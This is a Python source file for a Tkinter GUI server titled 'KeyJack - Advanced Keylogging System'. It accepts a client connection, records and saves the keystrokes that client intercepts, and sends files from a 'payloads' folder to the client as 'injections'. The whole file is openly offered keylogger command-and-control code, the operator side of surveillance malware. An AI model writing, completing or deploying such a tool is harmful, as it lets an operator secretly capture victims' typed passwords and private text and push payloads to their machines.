import socket
import threading
import tkinter as tk
from tkinter import filedialog, font, messagebox, ttk
import os
import shutil

IP = 'localhost'
PORT = 10319

class KeyJackServer:
    def __init__(self):
        self.file_list = []
        self.connected_client = None
        self.server_socket = None
        self.attacks_dir = "payloads"
        self.setup_gui()
        self.setup_network()
        self.root.mainloop()

    def on_select(self, event):
        selected = event.widget.get()
        full_path = self.get_full_path(selected)
        print(f"Selected full path: {full_path}")
        self.update_file_description(selected)

    def get_full_path(self, selected_item):
        return os.path.join(self.attacks_dir, selected_item.strip())

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("KeyJack - Advanced Keylogging System")
        self.root.geometry("900x700")
        self.root.configure(bg='#2E2E2E')

        self.style = ttk.Style()
        self.style.theme_use('clam')
        self.style.configure('TNotebook', background='#2E2E2E')
        self.style.configure('TNotebook.Tab', background='#3E3E3E', foreground='#FFFFFF', padding=[10, 5])
        self.style.map('TNotebook.Tab', background=[('selected', '#4E4E4E')])

        self.cyber_font = font.Font(family="Consolas", size=10)
        self.title_font = font.Font(family="Consolas", size=20, weight="bold")

        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def create_widgets(self):
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=1)

        self.injection_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(self.injection_frame, text="Injection")
        self.setup_injection_tab()

        self.keystrokes_frame = ttk.Frame(self.notebook, style='TFrame')
        self.notebook.add(self.keystrokes_frame, text="Keystrokes")
        self.setup_keystrokes_tab()

        self.status_frame = tk.Frame(self.root, bg='#2E2E2E')
        self.status_frame.pack(fill=tk.X, pady=5)

        self.status_label = tk.Label(self.status_frame, text="STATUS: DISCONNECTED", bg='#2E2E2E', fg='#FF0000',
                                     font=self.cyber_font)
        self.status_label.pack(side=tk.LEFT, padx=10)

        self.system_label = tk.Label(self.status_frame, text="[ SYSTEM READY ]", bg='#2E2E2E', fg='#00FF00',
                                     font=self.cyber_font)
        self.system_label.pack(side=tk.RIGHT, padx=10)

    def setup_injection_tab(self):
        repo_frame = ttk.Frame(self.injection_frame)
        repo_frame.pack(pady=10, padx=10, fill=tk.X)

        self.second_combobox = ttk.Combobox(repo_frame, width=50, state="readonly")
        self.second_combobox.set("Select a subfolder")
        self.second_combobox.bind("<<ComboboxSelected>>", self.on_second_select)
        self.second_combobox.pack(side=tk.LEFT, expand=True, fill=tk.X)

        self.file_combobox = ttk.Combobox(repo_frame, width=50, state="readonly")
        self.file_combobox.set("Select a file")
        self.file_combobox.bind("<<ComboboxSelected>>", self.on_select)
        self.file_combobox.pack(side=tk.LEFT, expand=True, fill=tk.X)

        self.refresh_button = ttk.Button(repo_frame, text="Refresh", command=self.load_subfolder_list)
        self.refresh_button.pack(side=tk.RIGHT, padx=5)

        self.upload_button = ttk.Button(repo_frame, text="Upload File", command=self.upload_file)
        self.upload_button.pack(side=tk.RIGHT, padx=5)

        self.file_description = tk.Label(self.injection_frame, text="", bg='#2E2E2E', fg='#00FF00',
                                         font=self.cyber_font, wraplength=850)
        self.file_description.pack(pady=5)

        self.command_center_area = tk.Text(self.injection_frame, height=15, bg='#000000', fg='#00FF00',
                                           font=self.cyber_font)
        self.command_center_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.execute_button = ttk.Button(self.injection_frame, text="EXECUTE INJECTION",
                                         command=self.handle_sending)
        self.execute_button.pack(pady=10)

        self.load_subfolder_list()

    def on_second_select(self, event):
        selected = self.second_combobox.get()
        if selected == 'All Files':
            self.load_file_list(None)
        else:
            full_path = os.path.join(self.attacks_dir, selected)
            print(f"Selected subfolder: {full_path}")
            self.load_file_list(selected)
        self.update_file_description(f"Selected subfolder: {selected}")

    def setup_keystrokes_tab(self):
        self.intercepted_keystrokes_area = tk.Text(self.keystrokes_frame, height=20, bg='#000000', fg='#00FF00',
                                                   font=self.cyber_font)
        self.intercepted_keystrokes_area.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        self.save_button = ttk.Button(self.keystrokes_frame, text="SAVE KEYSTROKES",
                                      command=self.save_keystrokes)
        self.save_button.pack(pady=10)

    def load_file_list(self, subfolder=None):
        options = []
        if subfolder and subfolder != 'All Files':
            search_dir = os.path.join(self.attacks_dir, subfolder)
        else:
            search_dir = self.attacks_dir

        for root, dirs, files in os.walk(search_dir):
            for f in files:
                relative_path = os.path.relpath(os.path.join(root, f), self.attacks_dir)
                options.append(relative_path)

        self.file_combobox['values'] = options
        if options:
            self.file_combobox.set(options[0])
            self.update_file_description(options[0])
        else:
            self.file_combobox.set('')
            self.file_description.config(text="No files found in the selected directory.")

    def load_subfolder_list(self):
        subfolders = ['All Files']
        for item in os.listdir(self.attacks_dir):
            if os.path.isdir(os.path.join(self.attacks_dir, item)):
                subfolders.append(item)

        self.second_combobox['values'] = subfolders
        self.second_combobox.set('All Files')
        self.on_second_select(None)

    def update_file_description(self, selected_file):
        if selected_file:
            file_path = self.get_full_path(selected_file)
            if os.path.isfile(file_path):
                try:
                    with open(file_path, 'r') as file:
                        content = file.read(100)
                    self.file_description.config(text=f"File: {file_path}\nPreview: {content}...")
                except Exception as e:
                    self.file_description.config(text=f"Error reading file: {str(e)}")
            else:
                self.file_description.config(text=f"Selected directory: {file_path}")
        else:
            self.file_description.config(text="")

    def handle_sending(self):
        selected_file = self.file_combobox.get()
        if selected_file:
            file_path = self.get_full_path(selected_file)
            if os.path.isfile(file_path):
                try:
                    with open(file_path, 'r') as file:
                        content = file.read()
                    if content:
                        self.send_message_to_client(selected_file, content)
                    else:
                        self.update_command_center("Error: File is empty.")
                except FileNotFoundError:
                    self.update_command_center(f"Error: File '{file_path}' not found.")
                except Exception as e:
                    self.update_command_center(f"Error reading file: {str(e)}")
            else:
                self.update_command_center("Selected item is a directory, not a file.")
        else:
            self.update_command_center("No file selected from the list.")

    def upload_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            file_name = os.path.basename(file_path)
            destination = os.path.join(self.attacks_dir, file_name)
            shutil.copy2(file_path, destination)
            self.load_file_list()
            messagebox.showinfo("File Upload", f"{file_name} has been uploaded to the attacks directory.")
        else:
            messagebox.showinfo("File Upload", "No file selected.")

    def setup_network(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((IP, PORT))
        self.server_socket.listen(1)

        threading.Thread(target=self.accept_connections, daemon=True).start()

    def accept_connections(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            self.connected_client = client_socket
            self.update_status("CONNECTED")
            threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if not data:
                    break
                self.update_intercepted_keystrokes(data)
            except:
                break
        self.connected_client = None
        self.update_status("DISCONNECTED")

    def send_message_to_client(self, file, message):
        if self.connected_client:
            try:
                self.connected_client.send(message.encode('utf-8'))
                self.update_command_center(f"Sent: {file}")
            except:
                self.update_command_center("Failed to send message.")
        else:
            self.update_command_center("No client connected.")

    def update_intercepted_keystrokes(self, message):
        self.intercepted_keystrokes_area.insert(tk.END, message)
        self.intercepted_keystrokes_area.see(tk.END)

    def update_command_center(self, message):
        self.command_center_area.insert(tk.END, message + "\n")
        self.command_center_area.see(tk.END)

    def update_status(self, status):
        self.status_label.config(text=f"STATUS: {status}", fg='#00FF00' if status == 'CONNECTED' else '#FF0000')

    def save_keystrokes(self):
        if not self.intercepted_keystrokes_area.get("1.0", tk.END).strip():
            messagebox.showinfo("Save Keystrokes", "No keystrokes to save.")
            return

        file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, 'w') as f:
                f.write(self.intercepted_keystrokes_area.get("1.0", tk.END))
            messagebox.showinfo("Save Keystrokes", f"Keystrokes saved to {file_path}")
            self.intercepted_keystrokes_area.delete("1.0", tk.END)
        else:
            messagebox.showinfo("Save Keystrokes", "Save operation cancelled.")

    def on_closing(self):
        if self.server_socket:
            self.server_socket.close()
        self.root.destroy()

if __name__ == "__main__":
    KeyJackServer()